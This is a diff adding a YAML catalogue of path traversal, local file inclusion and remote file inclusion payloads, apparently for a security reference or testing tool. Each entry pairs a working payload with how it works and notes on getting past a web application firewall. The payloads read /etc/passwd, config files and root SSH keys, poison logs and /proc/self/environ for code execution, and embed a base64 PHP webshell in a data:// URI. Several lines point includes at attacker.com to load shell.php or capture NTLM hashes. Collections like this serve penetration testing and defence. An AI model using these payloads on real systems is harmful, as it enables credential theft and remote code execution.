@@ -1,0 +1,430 @@
+slug: path-traversal
+name: Path Traversal / LFI / RFI
+owasp: A01:2021 – Broken Access Control
+description: 'Path traversal vulnerabilities allow an attacker to read files outside the intended directory by manipulating
+  file path parameters with sequences like ../. Local File Inclusion (LFI) allows reading or executing local server files;
+  Remote File Inclusion (RFI) allows loading and executing remote code. These vulnerabilities can lead to sensitive data disclosure,
+  credential exposure, and in severe cases, remote code execution.
+
+  '
+severity_range:
+  low: CVSS 5.3
+  high: CVSS 9.8
+references:
+- label: OWASP Path Traversal
+  url: https://owasp.org/www-community/attacks/Path_Traversal
+- label: PortSwigger Directory Traversal
+  url: https://portswigger.net/web-security/file-path-traversal
+groups:
+- slug: basic-traversal
+  name: Basic Path Traversal
+  description: Directory traversal sequences that navigate above the web root to read arbitrary server files.
+  difficulty: low
+  prerequisites:
+  - File path parameter controlled by user
+  - No path validation or canonicalization
+  payloads:
+  - id: pt-basic-001
+    title: Unix dotdot slash to passwd
+    payload_string: ../../../../etc/passwd
+    how_it_works: 'The ../ sequence in a file path navigates up one directory level. By chaining enough ../ sequences, the
+      attacker escapes the intended directory and reaches the filesystem root. /etc/passwd is the first target as it is world-readable
+      and confirms the vulnerability. The number of ../ sequences needed depends on how deeply nested the web root is. Using
+      more sequences than needed is safe because reaching / stops further traversal. This is the canonical path traversal
+      proof-of-concept.
+
+      '
+    prerequisites:
+    - Application reads files based on user parameter
+    - No path restriction
+    waf_bypass_notes: 'Try URL encoding: %2e%2e%2f; or %252e%252e%252f for double encode'
+    severity_context: CVSS 7.5 – reads /etc/passwd for user enumeration
+    cve_refs:
+    - CVE-2021-41773
+    tags:
+    - traversal
+    - unix
+    - passwd
+    - basic
+    - proof-of-concept
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-basic-002
+    title: Windows path traversal
+    payload_string: ..\..\..\windows\system32\drivers\etc\hosts
+    how_it_works: 'Windows uses backslash as the path separator. Path traversal on Windows uses ..\ to navigate up directories.
+      The Windows hosts file at system32\drivers\etc\hosts is world-readable and reveals internal DNS mappings and virtual
+      host configurations. Applications running on Windows IIS may also accept forward slashes, so both separator types should
+      be tested. The hosts file is a reliable low-risk read target for confirming Windows path traversal.
+
+      '
+    prerequisites:
+    - Windows server with IIS or other web server
+    - File path built from user input
+    waf_bypass_notes: Try mixing / and \ separators; use URL encoding %5c for backslash
+    severity_context: CVSS 7.5 – reads Windows hosts file for network reconnaissance
+    cve_refs:
+    - CVE-2019-0232
+    tags:
+    - traversal
+    - windows
+    - hosts-file
+    - backslash
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-basic-003
+    title: URL encoded traversal
+    payload_string: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+    how_it_works: 'URL encoding represents characters as their percent-encoded hex values. Filters that check for literal
+      ../ may be bypassed when the traversal sequence is URL-encoded. The server decodes the URL before passing it to file
+      open functions, resulting in ../../etc/passwd after decoding. This targets applications or WAFs that perform input validation
+      on the raw URL before decoding. Both single and double encoding variants should be tested.
+
+      '
+    prerequisites:
+    - Server URL-decodes path before file open
+    - Filter checks raw URL before decoding
+    waf_bypass_notes: Double encode with %252e%252e%252f for double-decode scenarios
+    severity_context: CVSS 7.5 – URL encoding bypass for path traversal
+    cve_refs:
+    - CVE-2021-41773
+    tags:
+    - traversal
+    - url-encoded
+    - filter-bypass
+    - encoding
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-basic-004
+    title: Null byte extension bypass
+    payload_string: ../../../../etc/passwd%00.jpg
+    how_it_works: 'In PHP and C-based applications, the null byte (%00) is treated as a string terminator at the C library
+      level. When an application appends a file extension (like .jpg) to user input before opening the file, the null byte
+      causes the C library''s fopen() to ignore everything after it. The actual file opened is /etc/passwd, not /etc/passwd.jpg.
+      This bypass is effective in older PHP versions (< 5.3.4) and C-based CGI applications but is not effective in modern
+      Python or Ruby applications.
+
+      '
+    prerequisites:
+    - Application appends file extension to user input
+    - PHP < 5.3.4 or C-based file handling
+    waf_bypass_notes: Null byte is PHP-specific; not applicable to modern PHP or other languages
+    severity_context: CVSS 7.5 – null byte extension bypass for LFI
+    cve_refs: []
+    tags:
+    - traversal
+    - null-byte
+    - php
+    - extension-bypass
+    - legacy
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-basic-005
+    title: Sensitive configuration file read
+    payload_string: ../../../../var/www/html/config.php
+    how_it_works: 'After confirming traversal with /etc/passwd, attackers target application configuration files that contain
+      database credentials, API keys, and secret keys. config.php is a common name for PHP application configuration. The
+      path may vary by application (config.yml, .env, settings.py, web.config). Database credentials in these files allow
+      direct database access bypassing the application layer entirely. API keys provide access to third-party services. This
+      escalates a file read to credential theft.
+
+      '
+    prerequisites:
+    - Traversal confirmed and config file path known
+    - Application stores credentials in config file
+    waf_bypass_notes: 'Known paths: /var/www/html/config.php, ../config/.env, web.config'
+    severity_context: CVSS 8.8 – database credential and API key theft via config file read
+    cve_refs:
+    - CVE-2017-7529
+    tags:
+    - traversal
+    - config-file
+    - credential-theft
+    - database-access
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-basic-006
+    title: SSH private key exfiltration
+    payload_string: ../../../../root/.ssh/id_rsa
+    how_it_works: 'If the web server process runs as root or if the traversal allows reading the root user''s home directory,
+      the SSH private key is an extremely valuable target. The id_rsa file contains the private RSA/Ed25519 key used for SSH
+      authentication. With this key, an attacker can SSH directly to the server and any other servers that trust this key''s
+      corresponding public key. SSH key theft often leads to lateral movement across multiple servers in an infrastructure.
+
+      '
+    prerequisites:
+    - Web server runs as root or has read access to /root
+    - SSH private key present at default location
+    waf_bypass_notes: Also try ~/.ssh/id_rsa, /home/ubuntu/.ssh/id_rsa for non-root users
+    severity_context: CVSS 9.8 – SSH private key theft enabling direct server access
+    cve_refs: []
+    tags:
+    - traversal
+    - ssh-key
+    - credential-theft
+    - lateral-movement
+    - high-impact
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: lfi
+  name: Local File Inclusion (LFI)
+  description: Application includes local server files in its response, enabling code execution via log poisoning, proc/self/environ,
+    or PHP wrappers.
+  difficulty: medium
+  prerequisites:
+  - Application uses PHP include/require or equivalent with user input
+  - Path traversal allows reaching target files
+  payloads:
+  - id: pt-lfi-001
+    title: PHP wrapper base64 source read
+    payload_string: php://filter/convert.base64-encode/resource=index.php
+    how_it_works: 'PHP stream wrappers allow applying filters to file reads. The php://filter wrapper with the convert.base64-encode
+      filter base64-encodes the file contents before returning them. This allows reading PHP source files without the PHP
+      engine executing them — without base64 encoding, PHP files execute rather than display their source. The attacker then
+      decodes the base64 output to read the PHP source code, revealing database credentials, application logic, and other
+      sensitive code. This is a key LFI technique for PHP apps.
+
+      '
+    prerequisites:
+    - PHP application with LFI in include/require
+    - PHP wrappers not disabled (allow_url_include irrelevant for php://filter)
+    waf_bypass_notes: php://filter is often missed by WAF; try different filter names
+    severity_context: CVSS 7.5 – PHP source code disclosure via php://filter wrapper
+    cve_refs:
+    - CVE-2021-41773
+    tags:
+    - lfi
+    - php-filter
+    - source-disclosure
+    - base64
+    - wrapper
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-lfi-002
+    title: Log poisoning via Apache access log
+    payload_string: ../../../../var/log/apache2/access.log
+    how_it_works: 'Log poisoning is a two-step LFI-to-RCE technique. First, the attacker injects PHP code into the Apache
+      access log by sending a request with PHP in the User-Agent header (e.g., User-Agent: <?php system($_GET[''cmd'']); ?>).
+      Apache logs this verbatim. Second, the attacker uses LFI to include the access log file, which causes PHP to execute
+      the embedded code. Once the webshell is in the log, any subsequent request to the LFI endpoint with ?cmd=id executes
+      OS commands. This escalates LFI to full RCE.
+
+      '
+    prerequisites:
+    - PHP LFI allows inclusion of /var/log/apache2/access.log
+    - Apache logs User-Agent without sanitization
+    - Web process has read access to Apache logs
+    waf_bypass_notes: 'Inject PHP into other log files: /var/log/nginx/access.log, /proc/self/fd/1'
+    severity_context: CVSS 9.8 – LFI to RCE via log poisoning
+    cve_refs:
+    - CVE-2021-42013
+    tags:
+    - lfi
+    - log-poisoning
+    - rce
+    - apache-log
+    - two-step
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-lfi-003
+    title: /proc/self/environ code execution
+    payload_string: ../../../../proc/self/environ
+    how_it_works: '/proc/self/environ is a Linux virtual file that contains environment variables for the current process.
+      It includes the HTTP_USER_AGENT variable which reflects the User-Agent header value. By poisoning the User-Agent with
+      PHP code before the LFI request, the PHP code appears in /proc/self/environ and executes when the file is included.
+      This is similar to log poisoning but uses /proc instead of log files, working even when log files are not readable.
+      It is a faster and more reliable LFI-to-RCE technique.
+
+      '
+    prerequisites:
+    - PHP LFI on Linux server
+    - /proc/self/environ readable by web process
+    waf_bypass_notes: Also try /proc/self/fd/0 - /proc/self/fd/2 for stdin/stdout/stderr
+    severity_context: CVSS 9.8 – LFI to RCE via /proc/self/environ User-Agent injection
+    cve_refs:
+    - CVE-2019-11043
+    tags:
+    - lfi
+    - proc-self
+    - environ
+    - rce
+    - linux
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-lfi-004
+    title: PHP session file inclusion
+    payload_string: ../../../../var/lib/php/sessions/sess_SESSIONID
+    how_it_works: 'PHP stores session data in files on the server filesystem, typically in /var/lib/php /sessions/ or /tmp/.
+      Session file names are sess_[SESSION_ID]. If user-controlled data is stored in the session (e.g., username stored in
+      $_SESSION[''user'']), and that session file is later included via LFI, the session data can contain PHP code. The attacker
+      first stores PHP code in a session variable (by submitting it as their username), then includes their session file to
+      execute the code. This is a reliable LFI-to-RCE chain.
+
+      '
+    prerequisites:
+    - PHP application with LFI
+    - User-controlled data stored in session
+    - Session file directory readable/predictable
+    waf_bypass_notes: 'Session ID from cookie; file path: /tmp/sess_[ID] on some configurations'
+    severity_context: CVSS 9.8 – LFI to RCE via PHP session file poisoning
+    cve_refs: []
+    tags:
+    - lfi
+    - session-inclusion
+    - session-poisoning
+    - rce
+    - php
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-lfi-005
+    title: Windows IIS LFI via UNC path
+    payload_string: \\attacker.com\share\malicious.asp
+    how_it_works: 'On Windows IIS servers, ASP/ASPX include mechanisms may follow UNC paths to network shares. By pointing
+      the include to an attacker-controlled SMB share, remote code in malicious.asp executes on the server. This is a form
+      of Remote File Inclusion specific to Windows networking. Additionally, the SMB connection attempt captures the server''s
+      NTLM hash via tools like Responder, enabling credential relay attacks even if the file itself cannot be loaded.
+
+      '
+    prerequisites:
+    - Windows IIS with ASP/ASPX LFI
+    - Outbound SMB to attacker allowed (or for NTLM capture)
+    waf_bypass_notes: UNC paths specific to Windows; NTLM capture works even if file load blocked
+    severity_context: CVSS 9.8 – Windows RFI/NTLM capture via UNC path inclusion
+    cve_refs: []
+    tags:
+    - lfi
+    - windows
+    - unc-path
+    - smb
+    - ntlm-capture
+    - iis
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: rfi
+  name: Remote File Inclusion (RFI)
+  description: Application includes remote files from attacker-controlled URLs, executing attacker-hosted code on the server.
+  difficulty: medium
+  prerequisites:
+  - allow_url_include = On in PHP, or equivalent in other languages
+  - User controls the file path/URL parameter
+  - Outbound HTTP from server to attacker allowed
+  payloads:
+  - id: pt-rfi-001
+    title: Basic PHP RFI
+    payload_string: http://attacker.com/shell.php
+    how_it_works: 'When PHP''s allow_url_include is enabled, file include functions (include, require, include_once, require_once)
+      can load and execute files from remote URLs. By pointing the include to an attacker-controlled PHP file, arbitrary PHP
+      code executes on the server. The remote server must be accessible from the target server. The attacker hosts a PHP webshell
+      on their server and the target server fetches and executes it, granting OS command execution. This is the most direct
+      path from RFI to RCE.
+
+      '
+    prerequisites:
+    - PHP with allow_url_include = On (off by default in PHP 5.2+)
+    - Outbound HTTP from target to attacker
+    waf_bypass_notes: allow_url_include is off by default in modern PHP; target legacy apps
+    severity_context: CVSS 9.8 – remote code execution via PHP remote file inclusion
+    cve_refs:
+    - CVE-2019-11043
+    tags:
+    - rfi
+    - php
+    - allow_url_include
+    - rce
+    - webshell
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-rfi-002
+    title: RFI with question mark trailing null
+    payload_string: http://attacker.com/shell.php?
+    how_it_works: 'When an application appends a fixed string (like .php) to the user-supplied include path, a trailing question
+      mark causes the appended string to become a URL query parameter on the attacker''s domain, which is ignored. The actual
+      file loaded is shell.php from the attacker''s server, without the appended extension. This bypasses applications that
+      enforce PHP extension requirements. It is a classic RFI extension bypass for applications like: include($page.''.php'').
+
+      '
+    prerequisites:
+    - Application appends .php or other extension to include path
+    - PHP RFI enabled
+    waf_bypass_notes: Question mark appends extension as harmless query string
+    severity_context: CVSS 9.8 – RFI with extension bypass via URL query string trick
+    cve_refs: []
+    tags:
+    - rfi
+    - extension-bypass
+    - question-mark
+    - php
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-rfi-003
+    title: PHP data:// wrapper RFI
+    payload_string: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+    how_it_works: 'PHP''s data:// stream wrapper allows embedding arbitrary content as a URI, similar to data URIs in HTML.
+      The base64-encoded content decodes to <?php system($_GET[''cmd'']); ?> — a PHP webshell. When allow_url_include is enabled,
+      including a data:// URI executes the embedded PHP code without requiring any external server. This is a self-contained
+      RFI technique that works even when outbound HTTP is blocked. The base64 encoding also bypasses filters looking for PHP
+      code in the URL.
+
+      '
+    prerequisites:
+    - PHP with allow_url_include = On
+    - data:// wrapper not disabled
+    waf_bypass_notes: Self-contained; no outbound connection needed; effective in egress-filtered environments
+    severity_context: CVSS 9.8 – self-contained PHP code execution via data:// wrapper
+    cve_refs: []
+    tags:
+    - rfi
+    - data-wrapper
+    - base64
+    - self-contained
+    - php
+    - rce
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-rfi-004
+    title: Python/Node SSI injection RFI
+    payload_string: <!--#include virtual="http://attacker.com/malicious.shtml" -->
+    how_it_works: 'Server-Side Includes (SSI) is a directive-based templating mechanism used by Apache and IIS. When SSI is
+      enabled and user content is embedded in .shtml or .stm pages, SSI directives execute server-side. The #include virtual
+      directive includes content from a URL. An attacker embedding this in an SSI-enabled page loads and executes remote content.
+      SSI can also execute shell commands via <!--#exec cmd="id"-->, providing direct command injection alongside RFI.
+
+      '
+    prerequisites:
+    - SSI enabled on Apache or IIS
+    - User content embedded in .shtml page
+    waf_bypass_notes: SSI directives in HTML comments; WAFs focused on PHP may miss this
+    severity_context: CVSS 9.8 – SSI remote include for server-side execution
+    cve_refs: []
+    tags:
+    - rfi
+    - ssi
+    - server-side-includes
+    - apache
+    - iis
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: pt-rfi-005
+    title: SSRF-assisted RFI via localhost
+    payload_string: http://127.0.0.1/internal/shell.php
+    how_it_works: 'When direct external RFI is blocked by egress firewall rules, the attacker can use internal network resources.
+      If the server hosts internal services on localhost that are not directly accessible from the internet, RFI pointing
+      to localhost effectively bypasses network segmentation. Files previously uploaded to the server (such as profile pictures
+      containing PHP code) can be included via their local URL path. This technique chains file upload with RFI, creating
+      a two-step attack.
+
+      '
+    prerequisites:
+    - RFI allows internal URLs
+    - Internal resource serves PHP-executable content
+    waf_bypass_notes: Localhost access bypasses external IP blocklisting in RFI filters
+    severity_context: CVSS 8.8 – RFI via localhost/internal network for SSRF-RFI chain
+    cve_refs: []
+    tags:
+    - rfi
+    - ssrf-chain
+    - localhost
+    - internal-network
+    - upload-chain
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
